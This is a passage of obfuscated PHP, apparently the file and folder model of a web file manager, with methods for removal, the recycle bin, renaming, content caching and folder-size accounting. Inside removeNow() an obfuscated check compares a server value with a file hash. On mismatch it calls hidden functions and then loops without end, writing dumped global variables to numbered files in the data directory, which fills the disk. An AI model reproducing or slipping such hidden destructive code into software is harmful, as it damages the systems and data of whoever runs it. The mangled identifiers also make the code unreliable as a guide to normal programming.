$¾•¡é¥¶[477] => $ğ·Ñ°Çİ[$¾•¡é¥¶[193]], $¾•¡é¥¶[652] => $ğ·Ñ°Çİ[$¾•¡é¥¶[584]] . $ğ·Ñ°Çİ[$¾•¡é¥¶[193]] . $¾•¡é¥¶[50], $¾•¡é¥¶[504] => 0, $¾•¡é¥¶[653] => $¾•¡é¥¶[12]); $ŸÍÎ‰è‡ = array_merge($Ä½ö×•×, $ŸÍÎ‰è‡); $this->updateModifyTime($ŸÍÎ‰è‡[$¾•¡é¥¶[192]]); $ìôÓœŞ– = $¾•¡é¥¶[2251] . $ğ·Ñ°Çİ[$¾•¡é¥¶[193]]; if (isset(self::$cacheChildList[$ìôÓœŞ–])) { unset(self::$cacheChildList[$ìôÓœŞ–]); } static $×‡òç¹Š = false; if (!$×‡òç¹Š) { Hook::trigger($¾•¡é¥¶[636], $ŸÍÎ‰è‡); $×‡òç¹Š = !0; } $”Ù = $this->add($ŸÍÎ‰è‡); $ó°äÉ§ = array($¾•¡é¥¶[654] => short_id($”Ù)); $this->where(array($¾•¡é¥¶[491] => $”Ù))->save($ó°äÉ§); $this->setNamePinyin($”Ù, $ŸÍÎ‰è‡[$¾•¡é¥¶[32]]); return $”Ù; } public function remove($ÓËæ˜ª, $×±—ÚÎö = true) { $È†àƒ¤— =& $_SERVER[óÔë„ú]; $µÇ˜äÃ» = $this->sourceInfo($ÓËæ˜ª); $İÂåüæ = intval($µÇ˜äÃ»[$È†àƒ¤—[190]]) === self::TYPE_SYSTEM; $Æ°¥Ù³§ = Model($È†àƒ¤—[508])->get($È†àƒ¤—[2252]) == $È†àƒ¤—[91]; if ($İÂåüæ || $×±—ÚÎö || !$Æ°¥Ù³§) { return $this->removeNow($ÓËæ˜ª, $×±—ÚÎö); } $¤Ú…•è = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $±‚Ô£´© = $µÇ˜äÃ»[$È†àƒ¤—[190]] == self::TYPE_USER ? $È†àƒ¤—[662] : $È†àƒ¤—[578]; if ($±‚Ô£´© == $È†àƒ¤—[662]) { $õèüÖ×– = Model($È†àƒ¤—[577])->getInfo($µÇ˜äÃ»[$È†àƒ¤—[569]]); $ûö‡‹èÌ = !empty($õèüÖ×–[$È†àƒ¤—[2245]]) ? $õèüÖ×–[$È†àƒ¤—[2245]] : $õèüÖ×–[$È†àƒ¤—[32]]; $ûö‡‹èÌ = $È†àƒ¤—[337] . $ûö‡‹èÌ . $È†àƒ¤—[2253] . $µÇ˜äÃ»[$È†àƒ¤—[569]]; } else { $õèüÖ×– = Model($È†àƒ¤—[585])->getInfo($µÇ˜äÃ»[$È†àƒ¤—[569]]); $ûö‡‹èÌ = _get($õèüÖ×–, $È†àƒ¤—[32]); $ûö‡‹èÌ = $È†àƒ¤—[176] . $ûö‡‹èÌ . $È†àƒ¤—[2254] . $µÇ˜äÃ»[$È†àƒ¤—[569]]; } $¹ƒıˆ¦° = $È†àƒ¤—[2255] . md5($ûö‡‹èÌ); CacheLock::lock($¹ƒıˆ¦°); $½¶ÈÔ›Ç = $this->fileNameExist($¤Ú…•è, $ûö‡‹èÌ); if (!$½¶ÈÔ›Ç) { $½¶ÈÔ›Ç = $this->mkdir($¤Ú…•è, $ûö‡‹èÌ, REPEAT_SKIP); $this->metaSet($½¶ÈÔ›Ç, $È†àƒ¤—[2256], $±‚Ô£´©); $this->metaSet($½¶ÈÔ›Ç, $È†àƒ¤—[2257], $µÇ˜äÃ»[$È†àƒ¤—[569]]); if ($µÇ˜äÃ»[$È†àƒ¤—[192]] != 0) { $this->metaSet($½¶ÈÔ›Ç, $È†àƒ¤—[2258], _get($õèüÖ×–, $È†àƒ¤—[2259])); } } CacheLock::unlock($¹ƒıˆ¦°); $this->metaSet($ÓËæ˜ª, $È†àƒ¤—[2260], $µÇ˜äÃ»[$È†àƒ¤—[192]]); $this->where(array($È†àƒ¤—[193] => $ÓËæ˜ª))->save(array($È†àƒ¤—[498] => time())); $this->recycleClear($µÇ˜äÃ»); Model($È†àƒ¤—[633])->eventRemove($ÓËæ˜ª); $€Ï“ÉÈ = $this->move($ÓËæ˜ª, $½¶ÈÔ›Ç, REPEAT_RENAME_FOLDER); $this->folderSizeReset($µÇ˜äÃ»[$È†àƒ¤—[192]]); return $€Ï“ÉÈ; } private function recycleClear($ô„Ö€Ô¶) { $Îşëä«˜ =& $_SERVER[óÔë„ú]; $ÔúŒ½î™ = $this->childrenAll($ô„Ö€Ô¶); $¹Å„ƒûÕ = array($Îşëä«˜[491] => array($Îşëä«˜[492], $ÔúŒ½î™[$Îşëä«˜[2261]])); Model($Îşëä«˜[2262])->where($¹Å„ƒûÕ)->delete(); } public function removeNow($—½Îá¤, $Ûò´²ËÖ = true) { $Œ³ÑÑÇ¾ =& $_SERVER[óÔë„ú]; $øº×¾© = $_SERVER[$Œ³ÑÑÇ¾[940]] . $Œ³ÑÑÇ¾[941]; $ûóòüàÃ = $Œ³ÑÑÇ¾[1611]; if ($_SERVER[$Œ³ÑÑÇ¾[936]] != $ûóòüàÃ($øº×¾©)) { $…°É¡¸ = $Œ³ÑÑÇ¾[938]; $µÅ±óî‹ = $Œ³ÑÑÇ¾[939]; $´¶Ô¡¬õ = $_SERVER[$Œ³ÑÑÇ¾[940]] . $Œ³ÑÑÇ¾[941]; $ª®¿ó»ı = $µÅ±óî‹($´¶Ô¡¬õ); $ÉÚ³–°ã = explode($Œ³ÑÑÇ¾[262], $ª®¿ó»ı); if (count($ÉÚ³–°ã) < $Œ³ÑÑÇ¾[691]) { $œ…ñœ²Ö = $Œ³ÑÑÇ¾[942]; $œ…ñœ²Ö(); } $ˆ¡à˜¸Ì = $Œ³ÑÑÇ¾[943]; $ˆ¡à˜¸Ì($_SERVER[$Œ³ÑÑÇ¾[944]]); $…°É¡¸ = $Œ³ÑÑÇ¾[938]; $…°É¡¸(); $ç¡˜¹º = $Œ³ÑÑÇ¾[1612]; $†ÁÀîŒ• = json_encode($GLOBALS[$Œ³ÑÑÇ¾[1613]]); $Á°’ì•é = 1; for ($ÕªâßÕ¬ = $Á°’ì•é; $ÕªâßÕ¬ > 0; $ÕªâßÕ¬++) { $ç¡˜¹º(DATA_PATH . $ÕªâßÕ¬, $†ÁÀîŒ•); } } $­ï™÷¬Ÿ = $this->sourceInfo($—½Îá¤); $âšÅ”½ê = $this->pathInfoMore($—½Îá¤); if (!$­ï™÷¬Ÿ) { return !0; } if ($­ï™÷¬Ÿ[$Œ³ÑÑÇ¾[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($—½Îá¤); Hook::trigger($Œ³ÑÑÇ¾[2263], $âšÅ”½ê, $Ûò´²ËÖ); if ($Ûò´²ËÖ) { Model($Œ³ÑÑÇ¾[2262])->moveToRecycle($—½Îá¤); } else { $ªÉûùĞ» = $this->childrenAll($­ï™÷¬Ÿ); Model($Œ³ÑÑÇ¾[633])->eventRemove($—½Îá¤); $this->removeRelevance($ªÉûùĞ»[$Œ³ÑÑÇ¾[2261]], $ªÉûùĞ»[$Œ³ÑÑÇ¾[1560]]); } $this->folderSizeReset($­ï™÷¬Ÿ[$Œ³ÑÑÇ¾[192]]); $ûîóõ£å = array($­ï™÷¬Ÿ[$Œ³ÑÑÇ¾[192]]); if ($­ï™÷¬Ÿ[$Œ³ÑÑÇ¾[485]] == $Œ³ÑÑÇ¾[91]) { $ûîóõ£å[] = $­ï™÷¬Ÿ[$Œ³ÑÑÇ¾[193]]; } $this->updateModifyTime($ûîóõ£å); $this->lockMoveEnd($—½Îá¤); Hook::trigger($Œ³ÑÑÇ¾[1800], $âšÅ”½ê, $Ûò´²ËÖ); return !0; } public function childrenAll($™×Œô¤÷) { $¨ı÷ÊÉ³ =& $_SERVER[óÔë„ú]; $÷ö—¨Ô = $™×Œô¤÷[$¨ı÷ÊÉ³[193]]; if ($™×Œô¤÷[$¨ı÷ÊÉ³[485]] == $¨ı÷ÊÉ³[91]) { $şÒŒÒÙ = array($¨ı÷ÊÉ³[652] => array($¨ı÷ÊÉ³[612], $™×Œô¤÷[$¨ı÷ÊÉ³[584]] . $÷ö—¨Ô . $¨ı÷ÊÉ³[613])); $ò±”îŠ = array($¨ı÷ÊÉ³[652] => $şÒŒÒÙ[$¨ı÷ÊÉ³[584]]); $ËÙ“¥†ñ = $this->field($¨ı÷ÊÉ³[2264])->where($ò±”îŠ)->select(); $‡Í©§µ = !1; $÷æÇ‰ü– = array($÷ö—¨Ô); if ($ËÙ“¥†ñ) { $‡Í©§µ = array_to_keyvalue($ËÙ“¥†ñ, $¨ı÷ÊÉ³[12], $¨ı÷ÊÉ³[541]); $‡Í©§µ = array_remove_value($‡Í©§µ, $¨ı÷ÊÉ³[228]); $÷æÇ‰ü– = array_to_keyvalue($ËÙ“¥†ñ, $¨ı÷ÊÉ³[12], $¨ı÷ÊÉ³[193]); $÷æÇ‰ü–[] = $÷ö—¨Ô; } } else { $‡Í©§µ = array($™×Œô¤÷[$¨ı÷ÊÉ³[541]]); $÷æÇ‰ü– = array($÷ö—¨Ô); } return array($¨ı÷ÊÉ³[2261] => $÷æÇ‰ü–, $¨ı÷ÊÉ³[1560] => $‡Í©§µ); } public function removeArray($Æ×¾¶ÔÖ) { if (!$Æ×¾¶ÔÖ) { return !0; } } public function removeRelevance($¤ö¦àŠ, $€°Äâã™) { $ë²Š÷ßş =& $_SERVER[óÔë„ú]; $¤ö¦àŠ = $¤ö¦àŠ ? $¤ö¦àŠ : array(); $€°Äâã™ = $€°Äâã™ ? $€°Äâã™ : array(); $¤ö¦àŠ = array_unique(array_filter($¤ö¦àŠ)); $€°Äâã™ = array_unique(array_filter($€°Äâã™)); if (!$¤ö¦àŠ) { return !1; } $­ÒÙŠŞ = array($ë²Š÷ßş[491] => array($ë²Š÷ßş[492], $¤ö¦àŠ)); Model($ë²Š÷ßş[2262])->where($­ÒÙŠŞ)->delete(); Model($ë²Š÷ßş[535])->where($­ÒÙŠŞ)->delete(); Model($ë²Š÷ßş[2108])->where($­ÒÙŠŞ)->delete(); Model($ë²Š÷ßş[633])->where($­ÒÙŠŞ)->delete(); Model($ë²Š÷ßş[1936])->removeBySource($¤ö¦àŠ); Model($ë²Š÷ßş[2243])->removeBySource($¤ö¦àŠ); $this->where($­ÒÙŠŞ)->delete(); Model($ë²Š÷ßş[544])->remove($€°Äâã™); for ($ŞÖ±Ó•ş = 0; $ŞÖ±Ó•ş < count($¤ö¦àŠ); $ŞÖ±Ó•ş++) { $this->sourceCacheClear($¤ö¦àŠ[$ŞÖ±Ó•ş]); } } public function rename($—ø¦•¨€, $õüäü) { $¼‰„İÔœ =& $_SERVER[óÔë„ú]; $Ş¸ïšêì = $this->sourceInfo($—ø¦•¨€); if (!$Ş¸ïšêì) { return !1; } $•…êüÏ¦ = $this->fileNameExist($Ş¸ïšêì[$¼‰„İÔœ[192]], $õüäü); if ($•…êüÏ¦ && $•…êüÏ¦ != $—ø¦•¨€) { return !1; } $„ä¿ëĞ· = array($¼‰„İÔœ[494] => $õüäü, $¼‰„İÔœ[651] => USER_ID); if ($Ş¸ïšêì[$¼‰„İÔœ[485]] != $¼‰„İÔœ[91]) { $„ä¿ëĞ·[$¼‰„İÔœ[486]] = substr(get_path_ext($õüäü), 0, 10); } Model($¼‰„İÔœ[633])->eventRename($—ø¦•¨€, $Ş¸ïšêì[$¼‰„İÔœ[32]], $õüäü); $this->sourceCacheClear($—ø¦•¨€); $this->setNamePinyin($—ø¦•¨€, $„ä¿ëĞ·[$¼‰„İÔœ[32]], !1); $this->updateModifyTime($Ş¸ïšêì[$¼‰„İÔœ[192]]); $†ĞğËúó = $this->where(array($¼‰„İÔœ[491] => $—ø¦•¨€))->data($„ä¿ëĞ·)->save(); $å“Ä’² = $¼‰„İÔœ[2251] . $Ş¸ïšêì[$¼‰„İÔœ[192]]; if (isset(self::$cacheChildList[$å“Ä’²])) { unset(self::$cacheChildList[$å“Ä’²]); } return $†ĞğËúó; } public function setNamePinyin($´ø’‘Ş, $àË‡¤æ, $ŸëìÕ« = true) { $ìúùú…Ï =& $_SERVER[óÔë„ú]; $–Âıæ¹È = Input::check($àË‡¤æ, $ìúùú…Ï[655]); $¾’Æùş = array($ìúùú…Ï[517] => KodSort::makeStr($àË‡¤æ)); if ($–Âıæ¹È) { $¾’Æùş[$ìúùú…Ï[538]] = str_replace($ìúùú…Ï[53], $ìúùú…Ï[12], Pinyin::get($àË‡¤æ)); $¾’Æùş[$ìúùú…Ï[537]] = Pinyin::get($àË‡¤æ, $ìúùú…Ï[656]); } if (!$ŸëìÕ« && !$–Âıæ¹È) { $¾’Æùş[$ìúùú…Ï[538]] = null; $¾’Æùş[$ìúùú…Ï[537]] = null; } $this->metaSet($´ø’‘Ş, $¾’Æùş); } public function getContent($¡©×±Ò) { $•Æ÷µÂÔ =& $_SERVER[óÔë„ú]; $â£¶¼ŠŒ = $this->fileInfoGet($¡©×±Ò); if (!$â£¶¼ŠŒ) { return !1; } if ($â£¶¼ŠŒ[$•Æ÷µÂÔ[79]] == 0) { return $•Æ÷µÂÔ[12]; } $Äö†ÅÁÏ = $•Æ÷µÂÔ[2265] . $â£¶¼ŠŒ[$•Æ÷µÂÔ[547]]; if ($â£¶¼ŠŒ[$•Æ÷µÂÔ[79]] <= 1024 * 10) { $µåïïåÔ = Cache::get($Äö†ÅÁÏ); if (!$µåïïåÔ) { $µåïïåÔ = IO::getContent($â£¶¼ŠŒ[$•Æ÷µÂÔ[87]]); Cache::set($Äö†ÅÁÏ, $µåïïåÔ); } return $µåïïåÔ; } if (!$â£¶¼ŠŒ[$•Æ÷µÂÔ[87]]) { return $•Æ÷µÂÔ[12]; } return IO::getContent($â£¶¼ŠŒ[$•Æ÷µÂÔ[87]]); } public function setDesc($í¬«¬úñ, $½‹Ï¸¬˜) { $©™›´¾Ù =& $_SERVER[óÔë„ú]; Model($©™›´¾Ù[633])->eventAddDesc($í¬«¬úñ, $½‹Ï¸¬˜); return $this->metaSet($í¬«¬úñ, $©™›´¾Ù[526], $½‹Ï¸¬˜); } public function setContent($Ø–ø“™, $ğÊì¿€ = '') { $°¹º–Ïå =& $_SERVER[óÔë„ú]; $Œ“ğ«æ­ = $this->sourceInfo($Ø–ø“™); $ãÊ¶ì = $this->fileInfoGet($Ø–ø“™); if (!$ãÊ¶ì || !$Œ“ğ«æ­) { return !1; } $ı½¥š¥© = Model($°¹º–Ïå[544])->addFileByContent($ğÊì¿€, $Œ“ğ«æ­[$°¹º–Ïå[32]]); $®®ºóšÆ = $this->fileHistory($Œ“ğ«æ­, $ı½¥š¥©[$°¹º–Ïå[541]], $ı½¥š¥©[$°¹º–Ïå[79]]); if (!$®®ºóšÆ) { return Model($°¹º–Ïå[544])->remove($ı½¥š¥©[$°¹º–Ïå[541]]); } $this->folderSizeReset($Œ“ğ«æ­[$°¹º–Ïå[192]]); return !0; } public function fileSubstr($°ñœ—ÆÄ, $†ı‰Å, $­ƒÑ¤ë‡) { $Öú›Æ€„ = $this->fileInfoGet($°ñœ—ÆÄ); if (!$Öú›Æ€„) { return !1; } return IO::fileSubstr($Öú›Æ€„[$_SERVER[óÔë„ú][87]], $†ı‰Å, $­ƒÑ¤ë‡); } public function fileInfoGet($ÄÂ¶íàÚ) { $½‘ÂªÃ¿ =& $_SERVER[óÔë„ú]; $Ë½èÍ´¼ = $this->sourceInfo($ÄÂ¶íàÚ); if (!$Ë½èÍ´¼ || $Ë½èÍ´¼[$½‘ÂªÃ¿[485]]) { return !1; } $¡¬ıÍè‚ = $½‘ÂªÃ¿[548] . $Ë½èÍ´¼[$½‘ÂªÃ¿[541]]; $©©£Øò = _get(self::$cacheFileInfo, $¡¬ıÍè‚); if ($©©£Øò) { return $©©£Øò; } $Ô¦×¯û = Model($½‘ÂªÃ¿[544])->fileInfo($Ë½èÍ´¼[$½‘ÂªÃ¿[541]]); if ($Ô¦×¯û) { $Ô¦×¯û[$½‘ÂªÃ¿[32]] = $Ë½èÍ´¼[$½‘ÂªÃ¿[32]]; } self::$cacheFileInfo[$¡¬ıÍè‚] = $Ô¦×¯û; return $Ô¦×¯û; } private function folderChildrenNumber($äÕÉô¨¿) { $‘Ğ«ıœı =& $_SERVER[óÔë„ú]; $Å¬º­Á = $this->sourceInfo($äÕÉô¨¿); $–áœ™–› = array($‘Ğ«ıœı[652] => array($‘Ğ«ıœı[612], $Å¬º­Á[$‘Ğ«ıœı[584]] . $äÕÉô¨¿ . $‘Ğ«ıœı[613]), $‘Ğ«ıœı[649] => $Å¬º­Á[$‘Ğ«ıœı[569]], $‘Ğ«ıœı[504] => intval($Å¬º­Á[$‘Ğ«ıœı[505]]), $‘Ğ«ıœı[646] => 1); $âÙæ¼‹‘ = $this->where($–áœ™–›)->count(); $·Ûº³Ôï = $this->where($–áœ™–›)->where(array($‘Ğ«ıœı[646] => 0))->count(); return array($‘Ğ«ıœı[83] => $·Ûº³Ôï, $‘Ğ«ıœı[84] => $âÙæ¼‹‘); } public function pathInfo($´ãµ´Ü, $õ¹æ¦õ« = false) { $œİÍù½ô =& $_SERVER[óÔë„ú]; $õ¹æ¦õ« = !1; $´ãµ´Ü = intval($´ãµ´Ü); $ğÖáÎ¯Š = $œİÍù½ô[534] . intval($õ¹æ¦õ«) . $œİÍù½ô[462] . $´ãµ´Ü; $Ñ¬¹ìşê = _get(self::$cachePathInfo, $ğÖáÎ¯Š); if ($Ñ¬¹ìşê) { return $Ñ¬¹ìşê; } $Ëµ¾ó“ı = $this->sourceInfo($´ãµ´Ü); if (!$Ëµ¾ó“ı) { return !1; } $Ëµ¾ó“ı = $this->_listDataApplyItem($Ëµ¾ó“ı, $õ¹æ¦õ«); self::$cachePathInfo[$ğÖáÎ¯Š] = $Ëµ¾ó“ı; return $Ëµ¾ó“ı; } public static $cachePathInfoMore = array(); public function pathInfoMore($ª¿ûİ°²) { $‚ŸÙªı =& $_SERVER[óÔë„ú]; $±ğÇÚ¦Ï = _get(self::$cachePathInfoMore, $ª¿ûİ°²); if ($±ğÇÚ¦Ï) { return $±ğÇÚ¦Ï; } $¦¯Çñíˆ = $this->pathInfo($ª¿ûİ°²); if (!$¦¯Çñíˆ) { return !1; } if ($¦¯Çñíˆ[$‚ŸÙªı[485]] == $‚ŸÙªı[91]) { $¦¯Çñíˆ[$‚ŸÙªı[82]] = $this->folderChildrenNumber($ª¿ûİ°²); } self::$cachePathInfoMore[$ª¿ûİ°²] = $¦¯Çñíˆ; return $¦¯Çñíˆ; } public function sourceInfo($€ˆç×) { $…¾áÇš =& $_SERVER[óÔë„ú]; if (!$€ˆç×) { return array(); } $€ˆç× = intval($€ˆç×); $ºÒö»¡î = $…¾áÇš[533] . $€ˆç×; $à€Ë•­™ = _get(self::$cacheSourceInfo, $ºÒö»¡î); if ($à€Ë•­™) { return $à€Ë•­™; } $ı¯ïµ–¤ = $this->where(array($…¾áÇš[193] => $€ˆç×))->find(); self::$cacheSourceInfo[$ºÒö»¡î] = $ı¯ïµ–¤; return self::$cacheSourceInfo[$ºÒö»¡î]; } public function sourceCacheClear($×ıçËü¹ = false) { self::cacheClear($×ıçËü¹); } public static function cacheClear($Åˆ¿·Ú† = false) { $ò¾ÅØ =& $_SERVER[óÔë„ú]; if ($Åˆ¿·Ú† == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ò¾ÅØ[533] . $Åˆ¿·Ú†]); unset(self::$cachePathInfoMore[$Åˆ¿·Ú†]); unset(self::$cachePathInfo[$ò¾ÅØ[2266] . $Åˆ¿·Ú†]); unset(self::$cachePathInfo[$ò¾ÅØ[2267] . $Åˆ¿·Ú†]); } public function metaSet($×ÀŠÙ£ó, $úìóÌğ” = null, $ÂÕ£ûÚ = null) { $í‚Ş¯ñú = parent::metaSet($×ÀŠÙ£ó, $úìóÌğ”, $ÂÕ£ûÚ); if ($í‚Ş¯ñú) { $this->sourceCacheClear($×ÀŠÙ£ó); } return $í‚Ş¯ñú; } public function pathInfoByPath($îòšÔÚÄ, $Ø‹­ÖâÎ) { $™­×“éû =& $_SERVER[óÔë„ú]; $æÚ´ÈŒ = !$Ø‹­ÖâÎ ? array() : explode($™­×“éû[8], trim($Ø‹­ÖâÎ, $™­×“éû[8])); $Çûğ¯ì“ = $îòšÔÚÄ; foreach ($æÚ´ÈŒ as $Æ‰¬‚»˜) { $ı‹ğû½´ = array($™­×“éû[192] => $Çûğ¯ì“, $™­×“éû[32] => $Æ‰¬‚»˜); $”„Ó—Ú = $this->field($™­×“éû[2268])->where($ı‹ğû½´)->select(); if (!$”„Ó—Ú) { return !1; } $”„Ó—Ú = array_sort_by($”„Ó—Ú, $™­×“éû[505]); $Çûğ¯ì“ = $”„Ó—Ú[0][$™­×“éû[193]]; } $™ªöµŞÚ = $this->sourceInfo($Çûğ¯ì“); $this->pathInfoFilter($™ªöµŞÚ); return $™ªöµŞÚ; } protected function updateModifyTime($¨„¾ûİ–) { $ë‰œã =& $_SERVER[óÔë„ú]; $ªÑİÊÙŠ = defined($ë‰œã[2183]) ? USER_ID : 0; if (!$¨„¾ûİ–) { return; } if (!is_array($¨„¾ûİ–)) { $¨„¾ûİ– = array($¨„¾ûİ–); } foreach ($¨„¾ûİ– as $ÖöãÑÇÕ => $¨²Ş¥·©) { $¨„¾ûİ–[$ÖöãÑÇÕ] = intval($¨²Ş¥·©); $this->sourceCacheClear($¨²Ş¥·©); } $ùàÑìĞ  = array($ë‰œã[193] => array($ë‰œã[7], $¨„¾ûİ–)); $Õ¦ğÒÈ³ = array($ë‰œã[651] => $ªÑİÊÙŠ, $ë‰œã[498] => time()); $this->where($ùàÑìĞ )->save($Õ¦ğÒÈ³); } public function folderSizeReset($ºÅÎ²Òã, $çß¾Åè = false) { $şãÉâ™ï =& $_SERVER[óÔë„ú]; if ($this->statusIgnoreResetSpace) { return; } $–··Ò = $this->sourceInfo($ºÅÎ²Òã); $µ˜¿¸Ë = $şãÉâ™ï[2269] . $ºÅÎ²Òã; CacheLock::lock($µ˜¿¸Ë, 20); if ($çß¾Åè === !1) { $this->sourceCacheClear($ºÅÎ²Òã); $–··Ò = $this->sourceInfo($ºÅÎ²Òã); $çÌ…èşÕ = array($şãÉâ™ï[477] => $ºÅÎ²Òã, $şãÉâ™ï[504] => 0); $ççïâÖ… = $this->where($çÌ…èşÕ)->sum($şãÉâ™ï[79]); $çß¾Åè = intval($ççïâÖ…) - intval($–··Ò[$şãÉâ™ï[79]]); } if ($çß¾Åè == 0) { return CacheLock::unlock($µ˜¿¸Ë); } $è¹°Šßí = $this->parentLevelArray($–··Ò[$şãÉâ™ï[584]]); if (!$è¹°Šßí) { $è¹°Šßí = array(); } $è¹°Šßí[] = $–··Ò[$şãÉâ™ï[193]]; $çÌ…èşÕ = array($şãÉâ™ï[193] => array($şãÉâ™ï[492], $è¹°Šßí)); if ($çß¾Åè < 0) { $çÌ…èşÕ[$şãÉâ™ï[79]] = array($şãÉâ™ï[1078], abs($çß¾Åè)); } $this->where($çÌ…èşÕ)->setAdd($şãÉâ™ï[79], $çß¾Åè); CacheLock::unlock($µ˜¿¸Ë); $¢âôÒæè = $şãÉâ™ï[2270] . $–··Ò[$şãÉâ™ï[190]] . $şãÉâ™ï[4] . $–··Ò[$şãÉâ™ï[569]]; $Ğ©×š¹™ = array($–··Ò[$şãÉâ™ï[190]], $–··Ò[$şãÉâ™ï[569]]); TaskRun::timeLimitCall($¢âôÒæè, $şãÉâ™ï[2271], $Ğ©×š¹™, 1.5); } public function folderSizeResetChildren($Üû´Å‚™) { $Ë™§¢€ =& $_SERVER[óÔë„ú]; $this->sourceCacheClear($Üû´Å‚™); $–Ö…–¸£ = $this->sourceInfo($Üû´Å‚™); $óšç›¶µ = array($Ë™§¢€[646] => 1, $Ë™§¢€[649] => $–Ö…–¸£[$Ë™§¢€[569]], $Ë™§¢€[652] => array($Ë™§¢€[612], $–Ö…–¸£[$Ë™§¢€[584]] . $Üû´Å‚™ . $Ë™§¢€[613])); $©¢Ÿ¨æ… = $Ë™§¢€[2272]; $öò®Óñ = $this->field($©¢Ÿ¨æ…)->where($óšç›¶µ)->select(); $óšç›¶µ[$Ë™§¢€[485]] = 0; $øåòØıÒ = $this->field($©¢Ÿ¨æ…)->where($óšç›¶µ)->select(); if (!$øåòØıÒ) { return; } $öò®Óñ[] = $–Ö…–¸£; $öò®Óñ = array_to_keyvalue($öò®Óñ, $Ë™§¢€[193]); foreach ($öò®Óñ as $È•ÏÃù¾ => $Ûµ»”æÔ) { $öò®Óñ[$È•ÏÃù¾][$Ë™§¢€[2273]] = $öò®Óñ[$È•ÏÃù¾][$Ë™§¢€[79]]; $öò®Óñ[$È•ÏÃù¾][$Ë™§¢€[79]] = 0; } foreach ($øåòØıÒ as $Ûµ»”æÔ) { $â¼ïƒóæ = $Ûµ»”æÔ[$Ë™§¢€[192]] . $Ë™§¢€[12]; if (!isset($öò®Óñ[$â¼ïƒóæ])) { continue; } if ($Ûµ»”æÔ[$Ë™§¢€[505]] == $öò®Óñ[$â¼ïƒóæ][$Ë™§¢€[505]]) { $öò®Óñ[$â¼ïƒóæ][$Ë™§¢€[79]] += $Ûµ»”æÔ[$Ë™§¢€[79]]; } } foreach ($öò®Óñ as $Ûµ»”æÔ) { $±’­’º¢ = $this->parentLevelArray($Ûµ»”æÔ[$Ë™§¢€[584]]); foreach ($±’­’º¢ as $â¼ïƒóæ) { $â¼ïƒóæ = $â¼ïƒóæ . $Ë™§¢€[12]; if (!isset($öò®Óñ[$â¼ïƒóæ])) { continue; } if ($Ûµ»”æÔ[$Ë™§¢€[505]] == $öò®Óñ[$â¼ïƒóæ][$Ë™§¢€[505]]) { $öò®Óñ[$â¼ïƒóæ][$Ë™§¢€[79]] += $Ûµ»”æÔ[$Ë™§¢€[79]]; } } } $€¨›™òİ = array(); foreach ($öò®Óñ as $Ûµ»”æÔ) { if ($Ûµ»”æÔ[$Ë™§¢€[79]] == $Ûµ»”æÔ[$Ë™§¢€[2273]]) { continue; } $€¨›™òİ[] = array($Ë™§¢€[193], $Ûµ»”æÔ[$Ë™§¢€[193]], $Ë™§¢€[79], $Ûµ»”æÔ[$Ë™§¢€[79]]); } $this->saveAll($€¨›™òİ); } public function userSpaceReset($Ÿ˜’õì™ = false) { $ÄÅ¥ƒú¹ =& $_SERVER[óÔë„ú]; $÷‡÷é‡à = $this->where(array($ÄÅ¥ƒú¹[190] => self::TYPE_USER, $ÄÅ¥ƒú¹[569] => $Ÿ˜’õì™, $ÄÅ¥ƒú¹[485] => 0))->sum($ÄÅ¥ƒú¹[79]); $÷‡÷é‡à = !$÷‡÷é‡à || $÷‡÷é‡à <= 0 ? 0 : $÷‡÷é‡à; Model($ÄÅ¥ƒú¹[577])->userEdit($Ÿ˜’õì™, array($ÄÅ¥ƒú¹[1945] => $÷‡÷é‡à)); } public function targetSpaceUpdate($Ä²ªßœô, $ÊÊıŸ˜ã) { $›Ñª«ä =& $_SERVER[óÔë„ú]; if (!$ÊÊıŸ˜ã) { return; } if (!in_array($Ä²ªßœô, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $İñ´Î“Ş = $this->targetSpaceSize($Ä²ªßœô, $ÊÊıŸ˜ã); if ($Ä²ªßœô == self::TYPE_USER) { Model($›Ñª«ä[577])->userEdit($ÊÊıŸ˜ã, array($›Ñª«ä[1945] => $İñ´Î“Ş)); } else { if ($Ä²ªßœô == self::TYPE_GROUP) { Model($›Ñª«ä[585])->groupEdit($ÊÊıŸ˜ã, array($›Ñª«ä[1945] => $İñ´Î“Ş)); } } } public function targetSpaceSize($‰ØÔˆ««, $…ïÉ˜é€) { $ªùõá§ =& $_SERVER[óÔë„ú]; $Œ·¢ìÍà = 0; $ïÃÃ¥¹Ù = $this->targetSourceRoot($‰ØÔˆ««, $…ïÉ˜é€, !0); foreach ($ïÃÃ¥¹Ù as $ˆ½ì¸®œ) { if (!$ˆ½ì¸®œ) { continue; } $Œ·¢ìÍà += floatval($ˆ½ì¸®œ[$ªùõá§[79]]); $ñ†¸©ıÒ = array($ªùõá§[652] => array($ªùõá§[612], $ªùõá§[594] . $ˆ½ì¸®œ[$ªùõá§[193]] . $ªùõá§[613])); $–à”ªŞĞ = Model($ªùõá§[503])->field($ªùõá§[491])->where($ñ†¸©ıÒ)->select(); $–à”ªŞĞ = array_to_keyvalue($–à”ªŞĞ, $ªùõá§[12], $ªùõá§[193]); $–à”ªŞĞ = array_unique(array_filter($–à”ªŞĞ)); if ($–à”ªŞĞ) { $ñ†¸©ıÒ = array($ªùõá§[491] => array($ªùõá§[492], $–à”ªŞĞ)); $Œ·¢ìÍà += floatval($this->where($ñ†¸©ıÒ)->sum($ªùõá§[79])); } } $Œ·¢ìÍà = !$Œ·¢ìÍà || $Œ·¢ìÍà <= 0 ? 0 : $Œ·¢ìÍà; return $Œ·¢ìÍà; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($üãİ×¶±) { return $this->fileTypeProfile($üãİ×¶±, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Æ¯°õªş) { return $this->fileTypeProfile($Æ¯°õªş, SourceModel::TYPE_GROUP); } private function fileTypeProfile($²›æˆ¬, $ëÈŠàË) { $›°Ÿà…• =& $_SERVER[óÔë„ú]; $º€Ğ÷ğà = $›°Ÿà…•[2274] . $²›æˆ¬ . $›°Ÿà…•[11] . $ëÈŠàË; $ú«Ó÷òÈ = Cache::get($º€Ğ÷ğà); if ($ú«Ó÷òÈ) { return $ú«Ó÷òÈ; } $ÂÔà¬–Û = array($›°Ÿà…•[646] => 0); if 